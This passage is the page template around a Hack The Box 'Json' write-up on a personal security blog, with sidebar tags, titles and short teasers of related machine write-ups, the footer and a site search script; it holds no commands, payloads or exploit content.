rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hack The Box - Json - rizemon's blog&url=https://rizemon.github.io/posts/json-htb/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htbcybersanta-ctf/">HackTheBox CTF - Cyber Santa</a><li><a href="/posts/ticket1part2-thm/">TryHackMe - Pre Security Learning Path (Part 2) [PARTICIPATE IN THE GIVEAWAY!]</a><li><a href="/posts/oscp-reflection/">Post-OSCP Writeup</a><li><a href="/posts/granny-htb/">Hack The Box - Granny (Without Metasploit)</a><li><a href="/posts/cronos-htb/">Hack The Box - Cronos (Without Metasploit)</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/devel-htb/"><div class="card-body"> <span class="timeago small" > Jan 12, 2021 <i class="unloaded">2021-01-12T18:34:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Devel (Without Metasploit)</h3><div class="text-muted small"><p> Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the mach...</p></div></div></a></div><div class="card"> <a href="/posts/bounty-htb/"><div class="card-body"> <span class="timeago small" > Jan 17, 2021 <i class="unloaded">2021-01-17T03:44:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Bounty (Without Metasploit)</h3><div class="text-muted small"><p> Configuration The operating system that I will be using to tackle this machine is a Kali Linux VM. What I learnt from other writeups is that it was a good habit to map a domain name to the mach...</p></div></div></a></div><div class="card"> <a href="/posts/bastion-htb/"><div class="card-body"> <span class="timeago small" > Sep 7, 2019 <i class="unloaded">2019-09-07T23:11:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Bastion</h3><div class="text-muted small"><p> I found this machine a little hard at first as this was my first Windows machine and I wasn’t adept at exploiting Windows. After reading various write ups and guides online, I was able to root this...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/craft-htb/" class="btn btn-outline-primary"><p>Hack The Box - Craft</p></a> <a href="/posts/postman-htb/" class="btn btn-outline-primary"><p>Hack The Box - Postman</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="https://twitter.com/rizemon">rizemon</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy/" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/sqli/">sqli</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/juicypotato/">juicypotato</a> <a class="post-tag" href="/tags/rsa/">rsa</a> <a class="post-tag" href="/tags/smb/">smb</a> <a class="post-tag" href="/tags/sudo/">sudo</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://rizemon.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
